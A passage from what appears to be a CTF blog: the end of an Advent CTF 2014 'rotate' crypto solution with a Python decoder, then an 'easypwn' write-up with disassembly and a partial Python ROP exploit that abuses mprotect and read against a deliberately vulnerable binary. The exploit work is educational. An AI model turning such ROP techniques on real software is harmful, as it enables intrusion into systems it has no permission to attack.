</span><span class='line'>    <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">u</span><span class="p">(</span><span class="n">bs</span><span class="p">[</span><span class="n">i</span><span class="p">]),</span> <span class="n">u</span><span class="p">(</span><span class="n">bs</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>    <span class="n">enc</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">-</span> <span class="n">y</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">key</span><span class="p">))</span> <span class="o">+</span> <span class="n">p</span><span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">+</span> <span class="n">y</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">key</span><span class="p">)))</span>
</span></code></pre></td></tr></table></div></figure>


<p>The script takes two bytes at a time and transforms them into two floats via some goniometric functions, using a key. These floats are then dumped as DWORDS into the encrypted output file. Our first job is to determine what key was used.</p>

<p>Assuming the flag really <strong>is</strong> a JPEG, we have some prior knowledge. Namely, the first two bytes are <code>0xff,0xd8</code>. I made a small file that contains only these two bytes and I ripped the first 8 bytes from <code>flag.jpg.enc</code>. I encoded the small 2-byte file with all possible keys and then compared the md5sum of each file to the md5sum of the 8-byte encoded file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf/rotate<span class="nv">$ </span><span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">0</span> 360<span class="sb">`</span><span class="p">;</span> <span class="k">do</span> python rotate.py ./header_real2 <span class="nv">$i</span><span class="p">;</span> mv header_real2.enc output<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
</span><span class='line'>bas@tritonal:~/adventctf/rotate<span class="nv">$ </span>md5sum header_encoded8
</span><span class='line'>ed3f26885ebe2ba3ec0aa61215e4dcf2  header_encoded8
</span><span class='line'>bas@tritonal:~/adventctf/rotate<span class="nv">$ </span>md5sum output* <span class="p">|</span>grep ed3f2
</span><span class='line'>ed3f26885ebe2ba3ec0aa61215e4dcf2  output123
</span></code></pre></td></tr></table></div></figure>


<p>So I now know the key that was used was <code>123</code>. I then started building a decoder. I hit a few snags on the way. It turns out that <code>rotate.py</code> doesn&rsquo;t use the literal value of each byte, but instead uses <code>struct.unpack('b', byte)</code> to generate a <strong>signed</strong> representation. That threw me off for a good while.</p>

<p>The decoder first builds a lookup table of each possible two-byte combination. Then, to decode, it reads eight bytes at a time and looks up the corresponding values from the lookup table. If there are no more floats to be read, it catches the error and outputs the decrypted data:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">math</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;f&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'><span class="n">u</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">radians</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
</span><span class='line'>
</span><span class='line'><span class="n">enc</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&#39;rb&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">lookup</span> <span class="o">=</span> <span class="p">{}</span>
</span><span class='line'><span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
</span><span class='line'>      <span class="n">x</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">k</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>      <span class="n">y</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">l</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>      
</span><span class='line'>      <span class="n">x1</span> <span class="o">=</span> <span class="n">p</span><span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">-</span> <span class="n">y</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
</span><span class='line'>      <span class="n">x2</span> <span class="o">=</span> <span class="n">p</span><span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">sin</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="o">+</span> <span class="n">y</span> <span class="o">*</span> <span class="n">math</span><span class="o">.</span><span class="n">cos</span><span class="p">(</span><span class="n">key</span><span class="p">))</span>
</span><span class='line'>      
</span><span class='line'>      <span class="n">x3</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x1</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>      <span class="n">x4</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x2</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>      
</span><span class='line'>      <span class="n">lookup</span><span class="p">[</span> <span class="p">(</span><span class="n">x3</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">)</span><span class="o">+</span><span class="n">x4</span> <span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'><span class="n">going</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'><span class="n">decoded</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="k">while</span> <span class="n">going</span><span class="p">:</span>
</span><span class='line'>  <span class="k">try</span><span class="p">:</span>
</span><span class='line'>      <span class="n">f1</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">enc</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>      <span class="n">f2</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">enc</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>      
</span><span class='line'>      <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span> <span class="o">=</span> <span class="n">lookup</span><span class="p">[</span> <span class="p">(</span><span class="n">f1</span><span class="o">&lt;&lt;</span><span class="mi">32</span><span class="p">)</span><span class="o">+</span><span class="n">f2</span> <span class="p">]</span>
</span><span class='line'>      
</span><span class='line'>      <span class="n">decoded</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>      <span class="n">decoded</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
</span><span class='line'>  <span class="k">except</span><span class="p">:</span>
</span><span class='line'>      <span class="n">going</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>      <span class="k">print</span> <span class="n">decoded</span>
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s <em>horrible</em> code, but it got the job done:</p>

<p><img src="http://barrebas.github.io/assets/adctf/rotate-flag.jpg" alt="" /></p>

<p>The flag was <code>ADCTF_TR0t4T3_f4C3</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Easypwn]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn/"/>
    <updated>2014-12-21T10:24:42+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/21/advent-ctf-easypwn</id>
    <content type="html"><![CDATA[<p>Another pwnable, named &ldquo;easypwn&rdquo;, no less! Should be a walk in the park, right?</p>

<!-- more -->


<p>Of course, it turns out it wasn&rsquo;t! We&rsquo;re given only the executable. The challenge description informs us: no libs, ASLR enabled. Flag is in <code>/home/easypwn/flag</code>. Great! Disassembling the binary leads to the following code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>objdump -d easypwn -M intel
</span><span class='line'>
</span><span class='line'>easypwn:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Disassembly of section .text:
</span><span class='line'>
</span><span class='line'><span class="m">08048080</span> &lt;syscall&gt;:
</span><span class='line'> 8048080: 8b <span class="m">54</span> <span class="m">24</span> 0c           mov    edx,DWORD PTR <span class="o">[</span>esp+0xc<span class="o">]</span>
</span><span class='line'> 8048084: 8b 4c <span class="m">24</span> <span class="m">08</span>           mov    ecx,DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>
</span><span class='line'> 8048088: 8b 5c <span class="m">24</span> <span class="m">04</span>           mov    ebx,DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>
</span><span class='line'> 804808c: <span class="nb">cd </span><span class="m">80</span>                    int    0x80
</span><span class='line'> 804808e: c3                      ret
</span><span class='line'> 804808f: <span class="m">90</span>                       nop
</span><span class='line'>
</span><span class='line'><span class="m">08048090</span> &lt;pwn_me&gt;:
</span><span class='line'> 8048090: <span class="m">83</span> ec <span class="m">10</span>              sub    esp,0x10
</span><span class='line'> 8048093: b9 ed <span class="m">80</span> <span class="m">04</span> <span class="m">08</span>         mov    ecx,0x80480ed
</span><span class='line'> 8048098: b8 <span class="m">04</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x4          <span class="c"># write</span>
</span><span class='line'> 804809d: 6a <span class="m">08</span>                    push   0x8
</span><span class='line'> 804809f: <span class="m">51</span>                       push   ecx
</span><span class='line'> 80480a0: 6a <span class="m">01</span>                    push   0x1              <span class="c"># stdout</span>
</span><span class='line'> 80480a2: ff d6                   call   esi
</span><span class='line'> 80480a4: <span class="m">83</span> c4 0c                 add    esp,0xc
</span><span class='line'> 80480a7: <span class="m">89</span> e1                    mov    ecx,esp
</span><span class='line'> 80480a9: b8 <span class="m">03</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x3          <span class="c"># read</span>
</span><span class='line'> 80480ae: <span class="m">68</span> <span class="m">80</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   0x80             <span class="c"># 128 bytes</span>
</span><span class='line'> 80480b3: <span class="m">51</span>                       push   ecx
</span><span class='line'> 80480b4: 6a <span class="m">00</span>                    push   0x0              <span class="c"># stdin</span>
</span><span class='line'> 80480b6: ff d6                   call   esi
</span><span class='line'> 80480b8: <span class="m">83</span> c4 0c                 add    esp,0xc
</span><span class='line'> 80480bb: <span class="m">83</span> c4 <span class="m">10</span>              add    esp,0x10
</span><span class='line'> 80480be: c3                      ret
</span><span class='line'> 80480bf: <span class="m">90</span>                       nop
</span><span class='line'>
</span><span class='line'>080480c0 &lt;_start&gt;:
</span><span class='line'> 80480c0: <span class="m">56</span>                       push   esi
</span><span class='line'> 80480c1: be <span class="m">80</span> <span class="m">80</span> <span class="m">04</span> <span class="m">08</span>          mov    esi,0x8048080
</span><span class='line'> 80480c6: e8 c5 ff ff ff          call   <span class="m">8048090</span> &lt;pwn_me&gt;
</span><span class='line'> 80480cb: b9 f6 <span class="m">80</span> <span class="m">04</span> <span class="m">08</span>         mov    ecx,0x80480f6
</span><span class='line'> 80480d0: b8 <span class="m">04</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x4          <span class="c"># write</span>
</span><span class='line'> 80480d5: 6a <span class="m">13</span>                    push   0x13             <span class="c"># 0x13 bytes</span>
</span><span class='line'> 80480d7: <span class="m">51</span>                       push   ecx
</span><span class='line'> 80480d8: 6a <span class="m">01</span>                    push   0x1              <span class="c"># stdout</span>
</span><span class='line'> 80480da: ff d6                   call   esi
</span><span class='line'> 80480dc: <span class="m">83</span> c4 0c                 add    esp,0xc
</span><span class='line'> 80480df: b8 <span class="m">01</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>          mov    eax,0x1          <span class="c"># exit</span>
</span><span class='line'> 80480e4: 6a <span class="m">00</span>                    push   0x0
</span><span class='line'> 80480e6: ff d6                   call   esi
</span><span class='line'> 80480e8: <span class="m">83</span> c4 <span class="m">04</span>              add    esp,0x4
</span><span class='line'> 80480eb: 5e                      pop    esi
</span><span class='line'> 80480ec: c3                      ret
</span></code></pre></td></tr></table></div></figure>


<p>That&rsquo;s not a whole lot to work with. Running it gives a clue on what to do:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
</span><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>./easypwn
</span><span class='line'>pwn me: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>gdb ./easypwn core
</span><span class='line'>...snip...
</span><span class='line'>Core was generated by <span class="s1">&#39;./easypwn&#39;</span>.
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x45454545 in ?? ()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span></code></pre></td></tr></table></div></figure>


<p>OK, so it&rsquo;s a buffer overflow, yet stack is not executable. The program uses no libraries but syscalls to do its work. We must be able to ROP our way to the flag! We have the syscall gadget lined up for us at <code>0x08048080</code>. Looks easy, right? Wrong!</p>

<p>There is one <strong>big</strong> problem:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="m">08048080</span> &lt;syscall&gt;:
</span><span class='line'> 8048080: 8b <span class="m">54</span> <span class="m">24</span> 0c           mov    edx,DWORD PTR <span class="o">[</span>esp+0xc<span class="o">]</span>
</span><span class='line'> 8048084: 8b 4c <span class="m">24</span> <span class="m">08</span>           mov    ecx,DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>
</span><span class='line'> 8048088: 8b 5c <span class="m">24</span> <span class="m">04</span>           mov    ebx,DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>
</span><span class='line'> 804808c: <span class="nb">cd </span><span class="m">80</span>                    int    0x80
</span><span class='line'> 804808e: c3                      ret
</span><span class='line'> 804808f: <span class="m">90</span>                       nop
</span></code></pre></td></tr></table></div></figure>


<p>We have <em>no way</em> to set <code>eax</code>! The <code>eax</code> register contains the syscall number and is kind of crucial to what we want. I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> but I found no straightforward way to set <code>eax</code>. I&rsquo;d prefer a <code>mov eax</code> or <code>pop eax</code>, or even <code>sub eax</code> or <code>xor eax</code>. Anything, really! I dumped the ROP gadgets with <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">my own tool</a> and found this little gadget:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>RET: 0x80480e9: les eax, <span class="o">[</span>esi+ebx*2<span class="o">]</span><span class="p">;</span> ret<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now this is a strange way to set <code>eax</code>. The <code>les</code> operand does the following: it loads the 48-bit value at the location of <code>esi+ebx*2</code> and sets <code>eax</code> to the first 32 bits and the <code>es</code> register to the last 16 bits. <em>However</em>, <code>es</code> does not tolerate just any old value. If the wrong value is passed, the program SEGFAULTS. To keep things simple, I looked for values in the binary like this: <code>0x0000000i, 0x0000</code>. This would load 0xi in <code>eax</code> and 0x0 in <code>es</code>.</p>

<p>It seemed nearly impossible to build a ROP chain that would open, read and write the data from the flag file. For instance, where would I write the filename? On the stack? ASLR is enabled so I&rsquo;d have no idea of knowing where the stack is. Instead, I went with a different strategy.</p>

<p>I am going to use the syscall <code>mprotect</code> to make the code section from 0x8048000 to 0x8049000 writeable. When this succeeds, I can use syscall <code>read</code> to read in any shellcode from stdin to the code section. Finally, I simply return to that region.</p>

<p>A problem here is that I can&rsquo;t set <code>eax</code> to 125 (==mprotect) with my little gadget. Instead, I re-use the return value of the last syscall before the buffer overflow: <code>read</code>! The return value of that syscall will be the number of bytes read&hellip; If we pass in 125 bytes as payload, then we get exactly the syscall number of mprotect in <code>eax</code>!</p>

<p>Here&rsquo;s what I came up with, bit by bit. I started the binary via socat, to emulate the target system:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/adventctf<span class="nv">$ </span>socat TCP-LISTEN:28099,fork EXEC:./easypwn
</span></code></pre></td></tr></table></div></figure>


<p>And this is the ROP chain I built:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">telnetlib</span>
</span><span class='line'>
</span><span class='line'><span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x8048080</span>
</span><span class='line'><span class="n">POPRET</span> <span class="o">=</span> <span class="mh">0x80480eb</span>  <span class="c"># pop esi; ret</span>
</span><span class='line'><span class="n">ADDESP</span> <span class="o">=</span> <span class="mh">0x80480bb</span>  <span class="c"># add esp, 0x10; ret</span>
</span><span class='line'><span class="n">LESEAX</span> <span class="o">=</span> <span class="mh">0x80480e9</span>  <span class="c"># les eax,FWORD PTR [esi+ebx*2]</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span>       <span class="c"># smash stack!</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>   <span class="c"># I rely on the return value of the read syscall</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>    <span class="c"># fix stack with add esp, 10; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x8048000</span><span class="p">)</span>    <span class="c"># address to modify</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>   <span class="c"># length (page-aligned!)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>      <span class="c"># PROT_READ|PROT_WRITE|PROT_EXEC</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>      <span class="c"># dummy value</span>
</span><span class='line'>
</span><span class='line'><span class="c"># reset ebx so we can set eax using the next gadget</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">ADDESP</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>            <span class="c"># set ebx = 0</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span>   <span class="c"># don&#39;t care</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>      <span class="c"># don&#39;t care</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;AAAA&quot;</span>      <span class="c"># dummy</span>
</span><span class='line'>
</span><span class='line'><span class="c"># set eax = 3</span>
</span><span class='line'><span class="c"># 0x804834a:  0x00000003  0x00000000</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">POPRET</span><span class="p">)</span>    <span class="c"># pop esi; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x804834a</span><span class="p">)</span> <span class="c"># set esi = 0x804834a</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="n">LESEAX</span><span class="p">)</span>    <span class="c"># eax -&gt; 0x3 == syscall_read</span>
